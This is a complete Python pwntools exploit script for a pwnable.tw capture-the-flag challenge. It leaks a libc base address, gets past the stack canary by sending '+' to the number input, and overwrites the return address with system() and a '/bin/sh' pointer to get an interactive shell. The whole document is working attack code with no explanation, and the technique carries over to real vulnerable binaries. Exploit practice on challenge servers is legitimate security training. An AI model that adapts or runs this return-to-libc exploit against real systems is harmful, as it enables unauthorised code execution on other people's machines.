from pwn import *

io = remote('chall.pwnable.tw', 10101)
libc = ELF('./libc_32.so.6')

io.recvuntil(':')

# leak libc address
io.sendline(b'A' * 24)
io.recvline()
libc_leak = b'\0' + io.recvuntil(':')[0:3]
libc_leak = u32(libc_leak)
libc.address = libc_leak - 0x1b0000

# calculate system address and shell address
system_addr = libc.symbols['system']
sh_addr = next(libc.search(b'/bin/sh\x00'))

# overwrite return address
io.sendline('35')

# 1 ~ 23 in first 24 numbers
for i in range(24):
	io.recvuntil(': ')
	io.sendline(str(i))

# skip canary using '+'
io.recvuntil(': ')
io.sendline('+')

# 7 libc address
for i in range(7):
	io.recvuntil(': ')
	io.sendline(str(libc.address))

# system address
io.recvuntil(': ')
io.sendline(str(system_addr))
# junk, just set it to system_addr
io.recvuntil(': ')
io.sendline(str(system_addr))
# /bin/sh
io.recvuntil(': ')
io.sendline(str(sh_addr))

io.interactive()
